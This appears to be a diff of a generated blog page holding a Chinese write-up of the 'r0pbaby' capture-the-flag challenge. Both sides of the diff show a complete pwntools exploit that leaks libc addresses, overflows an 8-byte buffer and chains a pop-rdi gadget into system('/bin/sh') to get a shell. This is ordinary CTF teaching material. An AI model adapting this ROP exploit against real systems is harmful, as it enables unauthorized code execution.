@@ -435,7 +435,7 @@
                 
                   <span class="post-meta-item-text">Symbols count in article: </span>
                 
-                <span title="Symbols count in article">1.2k</span>
+                <span title="Symbols count in article">1.3k</span>
               
 
               
@@ -471,7 +471,7 @@
       
         <p>64位需要rdi传参，有PIE保护不能使用程序中的gadget，此处可以从libc中找   </p>
 <p>buf的大小是8，会造成缓冲区溢出<br>解题思路<br>1.找到一个gadget RDI<br>2.找到 <code>/bin/sh</code>地址<br>3.找到 <code>system</code> 函数地址<br>查找 gadget<br><code>ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &quot;pop|ret&quot;</code><br>查找 /bin/sh 字符串<br><code>strings -a -tx /lib/x86_64-linux-gnu/libc.so.6 | grep &quot;/bin/sh&quot;</code></p>
-<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">elf = ELF(<span class="string">'r0pbaby'</span>)</div><div class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</div><div class="line"><span class="built_in">io</span> = process(<span class="string">'./r0pbaby'</span>)</div><div class="line">sh = <span class="built_in">next</span>(libc.search(<span class="string">'/bin/sh'</span>))</div><div class="line">sys_offset = libc.symbols[<span class="string">'system'</span>]</div><div class="line">rdi_offset = <span class="number">0x000000000002144f</span></div><div class="line"></div><div class="line">def getFun(fun):</div><div class="line">    <span class="built_in">io</span>.recvuntil(<span class="string">"4) Exit\n:"</span>)</div><div class="line">    <span class="built_in">io</span>.sendline(<span class="string">'2'</span>)</div><div class="line">    <span class="built_in">io</span>.recvuntil(<span class="string">"Enter symbol:"</span>)</div><div class="line">    <span class="built_in">io</span>.sendline(fun)</div><div class="line">    msg = <span class="built_in">io</span>.recvuntil(<span class="string">"4) Exit\n: "</span>)</div><div class="line">    offset = msg.find(<span class="string">":"</span>)</div><div class="line">    offset2 = msg.find(<span class="string">"\n"</span>)</div><div class="line">    addr = msg[offset+<span class="number">2</span>:offset2]</div><div class="line">    <span class="keyword">return</span> long(addr,<span class="number">16</span>)</div><div class="line"></div><div class="line">sys_addr = getFun(<span class="string">'system'</span>) </div><div class="line">sh_addr = sys_addr-sys_offset + sh </div><div class="line">rdi_addr = sys_addr - sys_offset+rdi_offset</div><div class="line"></div><div class="line">payload = <span class="string">'a'</span>*<span class="number">8</span>+p64(rdi_addr)+p64(sh_addr)+p64(sys_addr)</div><div class="line"><span class="built_in">io</span>.recv()</div><div class="line"><span class="built_in">io</span>.sendline(<span class="string">'3'</span>)</div><div class="line"><span class="built_in">io</span>.recv()</div><div class="line"><span class="built_in">io</span>.sendline(str(len(payload)))</div><div class="line"><span class="built_in">io</span>.sendline(payload)</div><div class="line"><span class="built_in">io</span>.recvuntil(<span class="string">"Bad choice.\n"</span>)   </div><div class="line"><span class="built_in">io</span>.interactive()</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">elf = ELF(&apos;r0pbaby&apos;)</div><div class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</div><div class="line">io = process(&apos;./r0pbaby&apos;)</div><div class="line">sh = next(libc.search(&apos;/bin/sh&apos;))</div><div class="line">sys_offset = libc.symbols[&apos;system&apos;]</div><div class="line">rdi_offset = 0x000000000002144f</div><div class="line"></div><div class="line">def getFun(fun):</div><div class="line">    io.recvuntil(&quot;4) Exit\n:&quot;)</div><div class="line">    io.sendline(&apos;2&apos;)</div><div class="line">    io.recvuntil(&quot;Enter symbol:&quot;)</div><div class="line">    io.sendline(fun)</div><div class="line">    msg = io.recvuntil(&quot;4) Exit\n: &quot;)</div><div class="line">    offset = msg.find(&quot;:&quot;)</div><div class="line">    offset2 = msg.find(&quot;\n&quot;)</div><div class="line">    addr = msg[offset+2:offset2]</div><div class="line">    return long(addr,16)</div><div class="line"></div><div class="line">sys_addr = getFun(&apos;system&apos;) </div><div class="line">sh_addr = sys_addr-sys_offset + sh </div><div class="line">rdi_addr = sys_addr - sys_offset+rdi_offset</div><div class="line"></div><div class="line">payload = &apos;a&apos;*8+p64(rdi_addr)+p64(sh_addr)+p64(sys_addr)</div><div class="line">io.recv()</div><div class="line">io.sendline(&apos;3&apos;)</div><div class="line">io.recv()</div><div class="line">io.sendline(str(len(payload)))</div><div class="line">io.sendline(payload)</div><div class="line">io.recvuntil(&quot;Bad choice.\n&quot;)   </div><div class="line">io.interactive()</div></pre></td></tr></table></figure>
 <p>总结：简单的调用 system + “bin/sh” 通过寄存器 gadget “pop rdi;ret “传参</p>
 
       
@@ -593,7 +593,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">63</span>
+                    <span class="site-state-item-count">62</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -746,7 +746,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="Symbols count total">86k</span>
+    <span title="Symbols count total">88k</span>
   
 
   
@@ -755,7 +755,7 @@
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="Reading time total">1:18</span>
+    <span title="Reading time total">1:20</span>
   
 </div>
 
